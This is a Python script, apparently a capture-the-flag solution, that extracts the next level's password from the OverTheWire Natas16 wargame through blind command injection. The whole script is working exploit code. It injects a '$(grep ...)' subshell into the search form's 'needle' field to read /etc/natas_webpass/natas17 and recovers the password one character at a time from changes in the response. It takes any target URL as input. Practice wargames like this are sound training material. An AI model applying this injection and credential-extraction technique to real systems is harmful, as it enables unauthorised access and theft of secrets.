#!/usr/bin/env python3
"""
Name: Orobas - The Truth Extractor

Purpose:
This script extracts the password for natas17 by exploiting a command injection
vulnerability in the natas16 challenge. It uses a blind injection technique to
determine the password character by character.

Named after Orobas, the lesser demon of truth and prophecy who reveals secrets.

How it works:
The script injects shell commands through the search parameter. When a correct
character is guessed, the grep command returns a match, which affects the output
of the main command, causing a detectable change in the HTTP response.

Target: OverTheWire Natas16 wargame challenge
"""

import requests
from string import ascii_letters, digits


def extract_password(url, username, password, target_length=32):
    """Extract password using fast command injection technique."""
    chars = ascii_letters + digits
    auth = (username, password)
    found = ''
    session = requests.Session()  # Reuse connection
    
    print(f"[*] Orobas awakens... extracting truth from {url}")
    print(f"[*] Target length: {target_length}")
    
    while len(found) < target_length:
        for c in chars:
            payload = f'$(grep ^{found + c} /etc/natas_webpass/natas17)'
            data = {'needle': payload, 'submit': 'Search'}
            
            r = session.post(url, auth=auth, data=data, timeout=5)
            if 'African' not in r.text:
                found += c
                print(f"[+] Found: {found}")
                break
        else:
            break
    
    session.close()
    return found


def main():
    print("=" * 50)
    print("OROBAS - THE TRUTH EXTRACTOR")
    print("=" * 50)
    
    # Interactive input
    url = input("Target URL(Example 'http://target.com/natas16/'): ").strip()
    username = input("Username: ").strip()
    password = input("Password: ").strip()
    
    if not url.endswith('/'):
        url += '/'
    
    try:
        extracted = extract_password(url, username, password)
        print(f"\n[✓] Truth revealed: {extracted}")
    except KeyboardInterrupt:
        print("\n[!] Orobas dismissed")
    except Exception as e:
        print(f"\n[!] Error: {e}")


if __name__ == "__main__":
    main()
